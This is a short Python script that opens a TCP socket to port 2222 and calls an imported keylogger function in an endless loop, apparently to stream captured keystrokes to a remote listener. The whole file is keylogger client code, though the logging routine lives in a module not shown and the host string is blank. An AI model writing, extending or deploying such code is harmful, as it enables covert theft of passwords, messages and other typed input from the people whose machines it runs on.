import socket as s
from keylogging import keylogger

sock = s.socket(s.AF_INET,s.SOCK_STREAM)
sock.connect(('',2222))
while True:
    keylogger(sock)
